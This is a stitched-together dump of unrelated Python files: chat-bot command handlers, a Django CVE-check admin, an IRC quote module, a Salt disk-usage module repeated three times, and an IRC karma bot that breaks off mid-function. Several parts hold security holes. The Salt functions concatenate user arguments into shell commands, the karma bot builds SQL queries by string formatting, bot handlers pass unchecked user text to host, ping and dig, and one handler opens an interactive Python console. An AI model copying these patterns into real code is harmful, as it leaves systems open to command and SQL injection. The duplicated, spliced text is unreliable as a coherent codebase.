                            
if __name__ == "__main__":
    unittest.main()


import binascii
import errno
import random
import subprocess
import sys
import os
import re
import socket
import argparse
from datetime import datetime, timedelta, date
import ipaddress
import logging
import calendar

try:
    import pytz
except ImportError:
    # no timezone support
    pytz = None

import foomodules.Base as Base
import foomodules.utils as utils
import foomodules.polylib as polylib

class Say(Base.MessageHandler):
    def __init__(self, variableTo=False, **kwargs):
        super().__init__(**kwargs)
        self.variableTo = variableTo

    def __call__(self, msg, arguments, errorSink=None):                    
        if self.variableTo:
            try:
                to, mtype, body = arguments.split(" ", 2)
            except ValueError as err:
                raise ValueError("Too few arguments: {0}".format(str(err)))
        else:
            if msg["type"] == "groupchat":
                to = msg["from"].bare
            else:
                to = msg["from"]
            body = arguments
            mtype = None
        self.reply(msg, body, overrideTo=to, overrideMType=mtype)


class Fnord(Base.MessageHandler):
    fnordlist = [
        "Fnord ist verdampfter Kräutertee - ohne die Kräuter",
        "Fnord ist ein wirklich, wirklich hoher Berg",
        "Fnord ist der Ort wohin die Socken nach der Wäsche verschwinden",
        "Fnord ist das Gerät der Zahnärzte für schwierige Patienten",
        "Fnord ist der Eimer, wo sie die unbenutzen Serifen von Helvetica lagern",
        "Fnord ist das Echo der Stille",
        "Fnord ist Pacman ohne die Punkte",
        "Fnord ist eine Reihe von nervigen elektronischen Nachrichten",
        "Fnord ist das Yin ohne das Yang",
        "Fnord ist die Verkaufssteuer auf die Fröhlichkeit",
        "Fnord ist die Seriennummer auf deiner Cornflakes-Packung",
        "Fnord ist die Quelle aller Nullbits in deinem Computer",
        "Fnord ist der Grund, warum Lisp so viele Klammern hat",
        "Fnord ist weder ein Partikel noch eine Welle",
        "Fnord ist die kleinste Zahl grösser Null",
        "Fnord ist der Grund, warum Ärzte wollen, dass du hustest",
        "Fnord ist der unbenutzte Münzeinwurf am Spielautomaten",
        "Fnord ist der Klang einer einzelnen klatschenden Hand",
        "Fnord ist die Ignosekunde bevor du die Löschtaste im falschen Dokument drückst",
        "Fnord ist wenn du Nachts an der roten Ampel stehst",
        "Fnord ist das Gefühl in deinem Kopf, wenn du die Luft zu lange hältst",
        "Fnord ist die leeren Seiten am Ende deines Buches",
        "Fnord ist der kleine grüne Stein in deinem Schuh",
        "Fnord ist was du denkst wenn du nicht weisst was du denkst",
        "Fnord ist die Farbe die nur der Blinde sieht",
        "Fnord ist Morgens spät und Abends früh",
        "Fnord ist wo die Busse sich verstecken in der Nacht",
        "Fnord ist der Raum zwischen den Pixeln auf deinem Bildschirm",
        "Fnord ist das Pfeifen in deinem Ohr",
        "Fnord ist das pelzige Gefühl auf deinen Zähnen am nächsten Tag",
        "Fnord ist die Angst und ist die Erleichterung und ist die Angst",
        "Fnord schläft nie",
        "Fnord ist xand.",
    ]

    def __call__(self, msg, arguments, errorSink=None):                    
        if len(arguments.strip()) > 0:
            return
        self.reply(msg, random.choice(self.fnordlist))
        return True

class Host(Base.MessageHandler):                    
    def __call__(self, msg, arguments, errorSink=None):                    
        proc = subprocess.Popen(
            ["host", arguments],                    
            stdout=subprocess.PIPE
        )
        output, _ = proc.communicate()
        output = output.decode().strip()

        self.reply(msg, output)                    

class Uptime(Base.MessageHandler):
    def __init__(self, show_users=False, **kwargs):
        super().__init__(**kwargs)
        self._show_users = show_users

    def __call__(self, msg, arguments, errorSink=None):                    
        if arguments.strip():
            return
        proc = subprocess.Popen(
            ["uptime"],
            stdout=subprocess.PIPE
        )
        output, _ = proc.communicate()
        output = output.decode().strip()

        if not self._show_users:
            output = re.sub("[0-9]+ users, ", "", output)

        self.reply(msg, output)                    

class Reload(Base.MessageHandler):
    def __call__(self, msg, arguments, errorSink=None):                    
        if arguments.strip():
            return
        self.xmpp.config.reload()


class REPL(Base.MessageHandler):
    def __call__(self, msg, arguments, errorSink=None):                    
        if arguments.strip():
            return
        import code
        namespace = dict(locals())
        namespace["xmpp"] = self.XMPP
        self.reply(msg, "Dropping into repl shell -- don't expect any further interaction until termination of shell access")
        code.InteractiveConsole(namespace).interact("REPL shell as requested")


class Respawn(Base.MessageHandler):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.argv = list(sys.argv)
        self.cwd = os.getcwd()

    def __call__(self, msg, arguments, errorSink=None):                    
        if arguments.strip():
            return
        print("disconnecting for respawn")
        self.XMPP.disconnect(reconnect=False, wait=True)
        print("preparing and running execv")
        os.chdir(self.cwd)
        os.execv(self.argv[0], self.argv)


class Peek(Base.ArgparseCommand):
    def __init__(self, timeout=3, command_name="peek", maxlen=256, **kwargs):
        super().__init__(command_name, **kwargs)
        self.timeout = timeout
        self.maxlen = maxlen
        self.argparse.add_argument(
            "-u", "--udp",
            action="store_true",
            dest="udp",
            default=False,
            help="Use UDP instead of TCP",
        )
        self.argparse.add_argument(
            "-6", "--ipv6",
            action="store_true",
            dest="ipv6",
            default=False,
            help="Use IPv6 sockets to connect to target"
        )
        self.argparse.add_argument(
            "host",
            help="Host or IP to connect to"
        )
        self.argparse.add_argument(
            "port",
            type=int,
            help="TCP/UDP port to connect to"
        )

    def recvline(self, sock):
        buf = b""
        while b"\n" not in buf and len(buf) < self.maxlen:
            try:
                data = sock.recv(1024)
                if len(data) == 0:
                    break  # this should not happen in non-blocking mode, but...
                buf += data
            except socket.error as err:
                if err.errno == errno.EAGAIN:
                    print("EAGAIN")
                    break
                raise
        return buf.split(b"\n", 1)[0]

    def _is_ipv6(self, host):
        try:
            return ipaddress.ip_address(host).version == 6
        except ValueError: # host is probably a hostname
            return False


    def _call(self, msg, args, errorSink=None):
        v6 = True if args.ipv6 else self._is_ipv6(args.host)
        fam = socket.AF_INET6 if v6 else socket.AF_INET

        typ = socket.SOCK_DGRAM if args.udp else socket.SOCK_STREAM
        sock = socket.socket(fam, typ, 0)
        sock.settimeout(self.timeout)
        try:
            sock.connect((args.host, args.port))
        except socket.error as err:
            self.reply(msg, "connect error: {0!s}".format(err))
            return
        try:
            try:
                buf = self.recvline(sock)
            except socket.timeout as err:
                self.reply(msg, "error: didn't receive any data in time")
                return
        finally:
            sock.close()

        if not buf:
            self.reply(msg, "error: nothing received before first newline")
            return

        try:
            reply = buf.decode("utf-8").strip()
            if utils.evil_string(reply):
                reply = None
        except UnicodeDecodeError as err:
            reply = None

        if reply is None:
            reply = "hexdump: {0}".format(binascii.b2a_hex(buf).decode("ascii"))
        else:
            hoststr = "[{}]".format(args.host) if self._is_ipv6(args.host) else args.host
            reply = "{host}:{port} says: {0}".format(reply, host=hoststr,
                port=args.port)

        self.reply(msg, reply)


class Ping(Base.ArgparseCommand):
    packetline = re.compile("([0-9]+) packets transmitted, ([0-9]+) received(.*), ([0-9]+)% packet loss, time ([0-9]+)ms")
    rttline = re.compile("rtt min/avg/max/mdev = (([0-9.]+/){3}([0-9.]+)) ms")

    def __init__(self, count=4, interval=0.5, command_name="ping", **kwargs):
        super().__init__(command_name, **kwargs)
        self.argparse.add_argument(
            "-6", "--ipv6",
            action="store_true",
            dest="ipv6",
            default=False,
            help="Use ping6 instead of ping"
        )
        self.argparse.add_argument(
            "--alot",
            action="store_true",
            dest="alot",
            help="Send more pings"
        )
        self.argparse.add_argument(
            "host",
            help="Host which is to be pinged"
        )
        self.pingargs = [
            "-q",
            "-i{0:f}".format(interval)
        ]

    def _call(self, msg, args, errorSink=None):
        pingcmd = ["ping6" if args.ipv6 else "ping"]
        if args.alot:
            count = 20
        else:
            count = 5
        pingcmd.append("-c{0:d}".format(count))
        proc = subprocess.Popen(
            pingcmd + self.pingargs + [args.host],                    
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        out, err = proc.communicate()
        if proc.wait() != 0:
            message = err.decode().strip()
            if not message:
                self.reply(msg, "unknown error, timeout/blocked?")
            else:
                self.reply(msg, "error: {0}".format(message))
        else:
            lines = out.decode().strip().split("\n")
            packetinfo = self.packetline.match(lines[3])
            rttinfo = self.rttline.match(lines[4])
            if not packetinfo or not rttinfo:
                self.reply(msg, "unknown error, unable to parse ping output, dumping to stdout")
                print(out.decode())
            else:
                packetinfo = packetinfo.groups()
                rttinfo = rttinfo.group(1).split("/")
                try:
                    message = "{host}: {recv}/{sent} pckts., {loss}% loss, rtt ↓/-/↑/↕ = {rttmin}/{rttavg}/{rttmax}/{rttmdev}, time {time}ms".format(
                        host=args.host,
                        sent=int(packetinfo[0]),
                        recv=int(packetinfo[1]),
                        loss=int(packetinfo[3]),
                        rttmin=rttinfo[0],
                        rttavg=rttinfo[1],
                        rttmax=rttinfo[2],
                        rttmdev=rttinfo[3],
                        time=int(packetinfo[4])
                    )
                except ValueError:
                    self.reply(msg, "malformatted ping output, dumping to stdout")
                    print(out.decode())
                    return
                self.reply(
                    msg,
                    message
                )

class Roll(Base.MessageHandler):
    rollex_base = "([0-9]*)[dW]([0-9]+)"
    rollex_all = re.compile("^(({0}\s+)*{0})(\s+(each\s+)?\w+\s+([0-9]+))?\s*$".format(rollex_base), re.I)
    rollex = re.compile(rollex_base, re.I)

    def _too_much(self, msg):
        self.reply(msg, "yeah, right, I'll go and rob a die factory")

    def __call__(self, msg, arguments, errorSink=None):                    
        matched = self.rollex_all.match(arguments)
        if not matched:
            self.reply(msg, "usage: XdY rolls a dY X times")
            return

        results = []
        die = matched.group(1)
        for match in self.rollex.finditer(die):
            if len(results) > 4000:
                self._too_much()
                return
            count, dice = match.groups()
            count = int(count) if count else 1
            dice = int(dice)
            if count < 1:
                self.reply(msg, "thats not a reasonable count: {}".format(count))
                return
            if dice <= 1:
                self.reply(msg, "thats not a reasonable die: {}".format(dice))
                return
            if count > 1000 or len(results) > 1000:
                self._too_much(msg)
                return
            results.extend(random.randint(1, dice) for i in range(count))

        against = matched.group(9)
        each = matched.group(8)
        suffix = ""
        print(repr(against))
        if against:
            against = int(against)
            if against >= sum(results):
                suffix = ": passed"
            else:
                suffix = ": failed"

        self.reply(msg, "results: {}, sum = {}{}".format(
            " ".join("{}".format(result) for result in results),
            sum(results),
            suffix
        ))

class Dig(Base.ArgparseCommand):
    def __init__(self, command_name="dig", **kwargs):
        super().__init__(command_name, **kwargs)
        self.argparse.add_argument(
            "-s", "--server", "--at",
            default=None,
            help="Server to ask for the record",
            dest="at"
        )
        self.argparse.add_argument(
            "kind",
            metavar="RECTYPE",
            nargs="?",
            default=None,
            type=lambda x: x.upper(),
            choices=["SRV", "A", "AAAA", "CNAME", "MX", "SOA", "TXT",
                "SPF", "NS", "SSHFP", "NSEC", "NSEC3", "DNSKEY", "RRSIG",
                "DS", "TLSA", "PTR"],
            help="Record kind to ask for"
        )
        self.argparse.add_argument(
            "name",
            metavar="NAME",
            help="Record name to look up"
        )

    def _call(self, msg, args, errorSink=None):
        userargs = [args.name]
        kindstr = ""
        if args.kind is not None:
            kindstr = " ({})".format(args.kind)
            userargs.insert(0, args.kind)
        atstr = ""
        if args.at is not None:
            atstr = "@"+args.at
            userargs.append(atstr)

        call = ["dig", "+time=2", "+short"] + userargs

        proc = subprocess.Popen(
            call,
            stdout=subprocess.PIPE
        )
        stdout, _ = proc.communicate()
        if proc.wait() != 0:
            self.reply(msg, stdout.decode().strip(";").strip())
            return

        results = list(filter(bool, stdout.decode().strip().split("\n")))

        if results:
            resultstr = ", ".join(results)
        else:
            resultstr = "no records"
        self.reply(msg, "{host}{at}{kind}: {results}".format(
            host=args.name,
            at=atstr,
            kind=kindstr,
            results=resultstr
        ))

# info on current CalendarWeek
class CW(Base.MessageHandler):
    def __call__(self, msg, arguments, errorSink=None):                    
        if arguments.strip():
            return
        current_date = date.today()
        current_cw = current_date.isocalendar()[1]
        current_year = current_date.year
        paritystr = ""
        if (current_cw % 2) == 0:
            paritystr = "even"
        else:
            paritystr = "odd"

        self.reply(msg, "Current week is week #{cw} in {year}, which is {parity}.".format(
            cw=current_cw,
            year=current_year,
            parity=paritystr
        ))


class Redirect(Base.MessageHandler):
    def __init__(self, new_name, **kwargs):
        super().__init__(**kwargs)
        self._new_name = new_name

    def __call__(self, msg, arguments, errorSink=None):                    
        self.reply(
            msg,
            "I don't know that. Did you mean: {} {}".format(
                self._new_name, arguments))


class Date(Base.MessageHandler):
    def __init__(self, timezone, **kwargs):
        super().__init__(**kwargs)
        if pytz is None:
            logging.warn("Timezone support disabled, install pytz to enable.")
            self._timezone = None
        else:
            self._timezone = pytz.timezone(timezone)

    def _format_date(self, dt):
        return dt.strftime("%a %d %b %Y %H:%M:%S %Z")

    def __call__(self, msg, arguments, errorSink=None):                    
        if arguments.strip():
            return

        if pytz is not None:
            dt = datetime.now(pytz.UTC)
            if self._timezone is not None:
                dt = dt.astimezone(self._timezone)
        else:
            dt = datetime.utcnow()
        self.reply(msg, self._format_date(dt))

class DiscordianDateTime:
    ST_TIBS_DAY = "St. Tib’s Day"

    HOLIDAYS = [
        "Mungday",
        "Chaoflux",
        "Mojoday",
        "Discoflux",
        "Syaday",
        "Confuflux",
        "Zaraday",
        "Bureflux",
        "Maladay",
    ]

    SEASONS = [
        "Chaos",
        "Discord",
        "Confusion",
        "Bureaucracy",
        "The Aftermath",
    ]

    WEEKDAYS = [
        "Sweetmorn",
        "Boomtime",
        "Pungenday",
        "Prickle-Prickle",
        "Setting Orange",
    ]

    yold = None
    seasonname = None
    season = None
    weekday = None
    weekdayname = None
    day = None
    hour = None
    minute = None
    second = None

    def __init__(self, dt):
        y, m, d = dt.year, dt.month, dt.day

        self.yold = y + 1166
        self.hour = dt.hour
        self.minute = dt.minute
        self.second = dt.second

        if (m, d) == (2, 29):
            self.weekdayname = self.ST_TIBS_DAY
        else:
            # this is ugly. if you know something better, tell me
            day_of_year = int(dt.strftime("%j"))

            if calendar.isleap(y):
                # 60th is St. Tib's Day
                if day_of_year > 60:
                    day_of_year -= 1

            season = int((day_of_year-1) / 73)
            self.season = season+1
            self.seasonname = self.SEASONS[season]

            self.day = (day_of_year-1) % 73 + 1

            self.weekday = (day_of_year-1) % 5 + 1
            if self.day == 5 or self.day == 50:
                # holiday
                offs = 1 if self.day == 50 else 0
                holidayidx = season*2 + offs
                self.weekdayname = self.HOLIDAYS[holidayidx]
            else:
                self.weekdayname = self.WEEKDAYS[self.weekday-1]

class DDate(Date):
    @staticmethod
    def _cardinal_number(num):
        suffixes = {
            "1": "st",
            "2": "nd",
            "3": "rd"
        }
        exceptions = {11, 12, 13}
        if num in exceptions:
            return "{:d}th".format(num)

        num = str(num)
        num += suffixes.get(num[-1], "th")
        return num

    def _format_date(self, dt):
        ddt = DiscordianDateTime(dt)
        if ddt.day is None:
            return "Today is {weekdayname} in the YOLD {yold:04d}".format(
                weekdayname=ddt.weekdayname,
                yold=ddt.yold)
        else:
            return "Today is {weekdayname}, the {card} day of {seasonname} in the YOLD {yold}".format(
                weekdayname=ddt.weekdayname,
                card=self._cardinal_number(ddt.day),
                seasonname=ddt.seasonname,
                yold=ddt.yold)


class Poly(Base.MessageHandler):
    divex = re.compile(r"^\s*(.*?)\s+mod\s+(.*?)\s+in\s+GF\(([0-9]+)\)\[(\w)\]\s*$", re.I)
    supunmap = {v: k for k, v in polylib.supmap.items()}

    def __init__(self, degree_limit=1024, **kwargs):
        super().__init__(**kwargs)
        self.degree_limit = degree_limit

    def _parse_coeff(self, cstr, var):
        coefficient, _, exponent = cstr.partition(var)
        if _ != var:
            try:
                return int(cstr), 0
            except ValueError:
                raise ValueError("Not a valid coefficient for a polynome in"
                                 " {var}: {}".format(cstr, var=var))
        if exponent.startswith("^"):
            # usual format, strip braces if there are any
            exponent = exponent[1:].replace("{", "").replace("}", "")
        else:
            # unicode format
            exponent = "".join(map(lambda x: self.supunmap.get(x, x), exponent))
        if not exponent:
            exponent = 1
        else:
            exponent = int(exponent)
        if not coefficient:
            coefficient = 1
        else:
            coefficient = int(coefficient)
        return coefficient, exponent

    def _parse_poly(self, pstr, var):
        # this removes spaces
        pstr = "".join(map(str.strip, pstr))
        summands = pstr.split("+")

        coefficients = list(map(lambda x: self._parse_coeff(x, var), summands))

        cs = [0]*(max(degree for _, degree in coefficients)+1)
        for value, degree in coefficients:
            if degree < 0:
                raise ValueError("Negative exponents are invalid for "
                                 "polynomials.")
            if self.degree_limit is not None and degree > self.degree_limit:
                raise ValueError("Polynomial out of supported range. "
                                 "Maximum degree is {}".format(
                                    self.degree_limit))
            cs[degree] = value
        return cs

    def _parse_instruction(self, s):
        match = self.divex.match(s)
        if match is None:
            raise ValueError("Could not parse command")
        poly1 = match.group(1)
        poly2 = match.group(2)
        instruction = "mod"#match.group(2)
        p = int(match.group(3))
        var = match.group(4)

        cs1 = self._parse_poly(poly1, var)
        cs2 = self._parse_poly(poly2, var)

        field = polylib.IntField(p)
        p1 = polylib.FieldPoly(field, cs1)
        p2 = polylib.FieldPoly(field, cs2)

        return p1, instruction, p2

    def __call__(self, msg, arguments, errorSink=None):                    
        if not arguments.strip():
            return

        try:
            p1, _, p2 = self._parse_instruction(arguments)
        except ValueError as err:
            self.reply(msg,
                "could not parse your request: {}. please use format: "
                "poly1 mod poly2 in GF(p)[x]".format(err))
            return

        try:
            d, r = divmod(p1, p2)
        except ZeroDivisionError:
            self.reply(msg, "division by zero")
            return

        self.reply(msg,
            "{a} // {b} = {d}; remainder: {r}".format(
                a=p1,
                b=p2,
                d=d,
                r=r))

import logging

from django.contrib import admin
from django.contrib import messages

from checkcve.forms import CheckCVEForm, CheckCVEChangeForm
from checkcve.models import Checkcve, Software, WhiteList, Cve
from checkcve.utils import create_check_cve_task

logger = logging.getLogger(__name__)


class CheckCVEAdmin(admin.ModelAdmin):
    form = CheckCVEForm

    def check_cve(self, request, obj):
        errors = list()
        test = True
        for probe in obj:
            try:
                probe.check_cve()
            except Exception as e:  # pragma: no cover
                test = False
                logger.exception('Error in check_cve ' + str(self.actions))
                errors.append(str(e))
        if test:
            messages.add_message(request, messages.SUCCESS, "Check CVE OK")
        else:  # pragma: no cover
            messages.add_message(request, messages.ERROR, "Check CVE failed ! " + str(errors))

    actions = [check_cve]

    def save_model(self, request, obj, form, change):
        create_check_cve_task(obj)
        super().save_model(request, obj, form, change)

    def get_form(self, request, obj=None, **kwargs):
        """A ModelAdmin that uses a different form class when adding an object."""
        if obj is None:
            return super(CheckCVEAdmin, self).get_form(request, obj, **kwargs)
        else:
            return CheckCVEChangeForm


class SoftwareAdmin(admin.ModelAdmin):                    
    class Media:                    
        js = (                    
            'checkcve/js/mask-command-field.js',                    
        )


admin.site.register(Checkcve, CheckCVEAdmin)
admin.site.register(Software, SoftwareAdmin)                    
admin.site.register(WhiteList)
admin.site.register(Cve)

from module import Module
from response.response import Response

import hashlib
import requests
import json
from datetime import date

class QDB2(Module):
	def __init__(self):
		self.modname = "Fearnode QDB"
		self.qdb_api_post = "http://qdb.vortigaunt.net/api/send/%s"
		self.qdb_login = "http://qdb.vortigaunt.net/login/%s"
		self.qdb_api_read = "http://qdb.vortigaunt.net/api/read/%s"
		self.qdb_secret = "[redacted]"
		self.quote_users = {}
	
	def parse(self, msg, cmd, user, arg):
		if cmd == ".read":
			response = Response()
			
			result = requests.get(self.qdb_api_read % arg[0])
			try:
				result = json.loads(result.content)
			
				if result['results'].has_key('success'):
					if result['results']['success'] == 1:
						quote = result['results']['data']['text'].split("\n")
						for line in quote:
							response.add_action(self.send_message(line))                    
					else:
						problem = {'hidden_quote': 'The quote is hidden.', 'no_such_quote': 'No such quote exists.'}[result['results']['error']]
						response.add_action(self.send_message("Error: " + problem))
			except:
				response.add_action(self.send_message('wodim, arregla el qdb.'))
				
			return self.multiple_response(response.generate_response())
		if cmd == ".password":
			m = hashlib.md5()
			m.update(date.today().strftime("%d/%m/%Y") + self.qdb_secret)
			password = m.hexdigest()[:8]
			
			return self.send_message(self.qdb_login % password)
		if msg[:5] == ".send":
			if user[:2] == "**":
				user = user[2:].strip()
			else:
				return self.ignore()
				
			if user not in self.quote_users:
					return self.send_raw_message("PRIVMSG " + user + " :Pega un quote antes.")
				
			quote = ""
			m = hashlib.md5()
			m.update(date.today().strftime("%d/%m/%Y") + self.qdb_secret)
			password = m.hexdigest()[:8]
			
			if(msg[:13] == ".send_private"):
				comment = msg[13:]
				private = 1
			else:
				comment = msg[5:]
				private = 0
				
			for line in self.quote_users[user]:
				quote = quote + "\n" + line
			
			if quote == "":
				return self.ignore()
			
			payload = {'nick': user + ' (bot)', 'text': quote, 'comment': comment, 'hidden': private}
			r = requests.post(self.qdb_api_post % password, data=payload)
			r = json.loads(r.content)
			
			self.quote_users[user] = []
			return self.send_message(r['results']['url'] + " " + comment + " (" + user + ")")
		elif cmd == ".cancel" and user[:2] == "**":
			user = user[2:]
			
			self.quote_users[user] = []
			return self.send_raw_message("PRIVMSG " + user + " :Hecho.")
		elif user[:2] == "**":
			user = user[2:]
			
			if user in self.quote_users:
				if self.quote_users[user] == []:
					send = True
				else:
					send = False
				
				self.quote_users[user].append(msg)
				
				if send:
					return self.send_raw_message("PRIVMSG " + user + " :Escribe .send <comentario> cuando termines, .send_private <comentario> para enviar quote privado, o .cancel para cancelar.")
				else:
					return self.accept()
			else:
				self.quote_users[user] = [msg]
				return self.send_raw_message("PRIVMSG " + user + " :Escribe .send <comentario> cuando termines, .send_private <comentario> para enviar quote privado, o .cancel para cancelar.")

		else:
			return self.ignore()

# -*- coding: utf-8 -*-
'''
Module for gathering disk information
'''

# Import python libs
import logging

# Import salt libs
import salt.utils

log = logging.getLogger(__name__)


def __virtual__():
    '''
    Only work on POSIX-like systems
    '''
    if salt.utils.is_windows():
        return False
    return 'disk'


def usage(args=None):
    '''
    Return usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.usage
    '''
    if __grains__['kernel'] == 'Linux':
        cmd = 'df -P'
    elif __grains__['kernel'] == 'OpenBSD':
        cmd = 'df -kP'
    else:
        cmd = 'df'
    if args:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if not line:
            continue
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        while not comps[1].isdigit():
            comps[0] = '{0} {1}'.format(comps[0], comps[1])
            comps.pop(1)
        try:
            if __grains__['kernel'] == 'Darwin':
                ret[comps[8]] = {
                        'filesystem': comps[0],
                        '512-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                        'iused': comps[5],
                        'ifree': comps[6],
                        '%iused': comps[7],
                }
            else:
                ret[comps[5]] = {
                        'filesystem': comps[0],
                        '1K-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                }
        except IndexError:
            log.warn("Problem parsing disk usage information")
            ret = {}
    return ret


def inodeusage(args=None):
    '''
    Return inode usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.inodeusage
    '''
    cmd = 'df -i'
    if args is not None:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        # Don't choke on empty lines
        if not comps:
            continue

        try:
            if __grains__['kernel'] == 'OpenBSD':
                ret[comps[8]] = {
                    'inodes': int(comps[5]) + int(comps[6]),
                    'used': comps[5],
                    'free': comps[6],
                    'use': comps[7],
                    'filesystem': comps[0],
                }
            else:
                ret[comps[5]] = {
                    'inodes': comps[1],
                    'used': comps[2],
                    'free': comps[3],
                    'use': comps[4],
                    'filesystem': comps[0],
                }
        except (IndexError, ValueError):
            log.warn("Problem parsing inode usage information")
            ret = {}
    return ret

# -*- coding: utf-8 -*-
'''
Module for gathering disk information
'''

# Import python libs
import logging

# Import salt libs
import salt.utils

log = logging.getLogger(__name__)


def __virtual__():
    '''
    Only work on POSIX-like systems
    '''
    if salt.utils.is_windows():
        return False
    return 'disk'


def usage(args=None):
    '''
    Return usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.usage
    '''
    if __grains__['kernel'] == 'Linux':
        cmd = 'df -P'
    elif __grains__['kernel'] == 'OpenBSD':
        cmd = 'df -kP'
    else:
        cmd = 'df'
    if args:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if not line:
            continue
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        while not comps[1].isdigit():
            comps[0] = '{0} {1}'.format(comps[0], comps[1])
            comps.pop(1)
        try:
            if __grains__['kernel'] == 'Darwin':
                ret[comps[8]] = {
                        'filesystem': comps[0],
                        '512-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                        'iused': comps[5],
                        'ifree': comps[6],
                        '%iused': comps[7],
                }
            else:
                ret[comps[5]] = {
                        'filesystem': comps[0],
                        '1K-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                }
        except IndexError:
            log.warn("Problem parsing disk usage information")
            ret = {}
    return ret


def inodeusage(args=None):
    '''
    Return inode usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.inodeusage
    '''
    cmd = 'df -i'
    if args is not None:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        # Don't choke on empty lines
        if not comps:
            continue

        try:
            if __grains__['kernel'] == 'OpenBSD':
                ret[comps[8]] = {
                    'inodes': int(comps[5]) + int(comps[6]),
                    'used': comps[5],
                    'free': comps[6],
                    'use': comps[7],
                    'filesystem': comps[0],
                }
            else:
                ret[comps[5]] = {
                    'inodes': comps[1],
                    'used': comps[2],
                    'free': comps[3],
                    'use': comps[4],
                    'filesystem': comps[0],
                }
        except (IndexError, ValueError):
            log.warn("Problem parsing inode usage information")
            ret = {}
    return ret

# -*- coding: utf-8 -*-
'''
Module for gathering disk information
'''

# Import python libs
import logging

# Import salt libs
import salt.utils

log = logging.getLogger(__name__)


def __virtual__():
    '''
    Only work on POSIX-like systems
    '''
    if salt.utils.is_windows():
        return False
    return 'disk'


def usage(args=None):
    '''
    Return usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.usage
    '''
    if __grains__['kernel'] == 'Linux':
        cmd = 'df -P'
    elif __grains__['kernel'] == 'OpenBSD':
        cmd = 'df -kP'
    else:
        cmd = 'df'
    if args:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if not line:
            continue
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        while not comps[1].isdigit():
            comps[0] = '{0} {1}'.format(comps[0], comps[1])
            comps.pop(1)
        try:
            if __grains__['kernel'] == 'Darwin':
                ret[comps[8]] = {
                        'filesystem': comps[0],
                        '512-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                        'iused': comps[5],
                        'ifree': comps[6],
                        '%iused': comps[7],
                }
            else:
                ret[comps[5]] = {
                        'filesystem': comps[0],
                        '1K-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                }
        except IndexError:
            log.warn("Problem parsing disk usage information")
            ret = {}
    return ret


def inodeusage(args=None):
    '''
    Return inode usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.inodeusage
    '''
    cmd = 'df -i'
    if args is not None:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        # Don't choke on empty lines
        if not comps:
            continue

        try:
            if __grains__['kernel'] == 'OpenBSD':
                ret[comps[8]] = {
                    'inodes': int(comps[5]) + int(comps[6]),
                    'used': comps[5],
                    'free': comps[6],
                    'use': comps[7],
                    'filesystem': comps[0],
                }
            else:
                ret[comps[5]] = {
                    'inodes': comps[1],
                    'used': comps[2],
                    'free': comps[3],
                    'use': comps[4],
                    'filesystem': comps[0],
                }
        except (IndexError, ValueError):
            log.warn("Problem parsing inode usage information")
            ret = {}
    return ret

#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socket
import sys
import urllib2
import os
import time
from pysqlite2 import dbapi2 as sqlite

channel = '#masmorra'
nick = 'carcereiro'
server = 'irc.oftc.net' 

def sendmsg(msg): 
    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\r\n')

class db():
	def __init__(self, dbfile):
		if not os.path.exists(dbfile):
			self.conn = sqlite.connect(dbfile)
			self.cursor = self.conn.cursor()
			self.create_table()
		self.conn = sqlite.connect(dbfile)
		self.cursor = self.conn.cursor()
	def close(self):
		self.cursor.close()
		self.conn.close()
	def create_table(self):
		self.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')
		self.conn.commit()
	def insert_karma(self,nome,total):
		try:
			self.cursor.execute("INSERT INTO karma(nome,total) VALUES ('%s', %d );" % (nome,total))
			self.conn.commit()
			return True
		except:
			#print "Unexpected error:", sys.exc_info()[0]
			return False
	def increment_karma(self,nome):
		if not self.insert_karma(nome,1):
			self.cursor.execute("UPDATE karma SET total = total + 1 where nome = '%s';" % (nome))
			self.conn.commit()
	def decrement_karma(self,nome):
		if not self.insert_karma(nome,-1):
			self.cursor.execute("UPDATE karma SET total = total - 1 where nome = '%s';" % (nome))
			self.conn.commit()
	def insert_url(self,nome,total):
		try:
			self.cursor.execute("INSERT INTO url(nome,total) VALUES ('%s', %d );" % (nome,total))
			self.conn.commit()
			return True
		except:
			return False
	def increment_url(self,nome):
		if not self.insert_url(nome,1):
